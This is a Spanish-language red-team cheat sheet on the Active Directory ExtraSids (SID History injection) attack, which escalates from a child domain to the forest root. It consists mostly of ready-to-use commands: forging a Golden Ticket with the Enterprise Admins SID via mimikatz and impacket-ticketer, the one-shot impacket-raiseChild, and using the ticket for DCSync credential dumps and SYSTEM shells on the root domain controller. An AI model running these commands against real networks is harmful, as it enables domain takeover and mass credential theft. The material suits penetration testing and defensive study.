---
aliases:
  - ExtraSids Attack
  - SID History Injection
tags:
  - technique/privilege-escalation
  - technique/lateral-movement
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Intra-Forest Trust Abuse]]"
  - "[[Golden Ticket]]"
---
# Intra-Forest Trust Abuse - ExtraSids

> Con el krbtgt del hijo + el SID de Enterprise Admins del root, se forja un Golden Ticket con ese SID en `ExtraSids`. **SID filtering no se aplica intra-forest** → escalás child → forest root.

---

## Forjar el Ticket con SID History

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:<CHILD_SID> /krbtgt:<HASH> /sids:<ROOT_SID>-519 /ptt` | Golden Ticket con Enterprise Admins en ExtraSids | Escalada child → root. |
| `impacket-ticketer -nthash <KRBTGT> -domain-sid <CHILD_SID> -domain child.corp.local -extra-sid <ROOT_SID>-519 Administrator` | Igual con Impacket (Linux) | Workflow Linux. |
| `impacket-raiseChild child.corp.local/childadmin:Pass` | **Auto**: dcsync child krbtgt → golden con ExtraSid EA → dump root | One-shot. |
^intra-extrasids-forge

## Usar el Ticket

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `impacket-secretsdump -k -no-pass dc-root.corp.local` | DCSync del root con el ticket | Dump del dominio raíz. |
| `impacket-psexec -k -no-pass dc-root.corp.local` | SYSTEM en el DC del root | Acceso interactivo. |
^intra-extrasids-use

### PoC (raiseChild = todo en uno)

```bash
impacket-raiseChild -target-exec dc-root.corp.local 'child.corp.local/Administrator:Pass123!'
# dcsync child krbtgt → forja golden con ExtraSid Enterprise Admins → dump/exec en root
```

> [!warning] Por qué funciona
> Intra-forest, **SID filtering está deshabilitado** → el SID de EA inyectado en ExtraSids se respeta. El krbtgt del hijo basta; no necesitás nada del root.
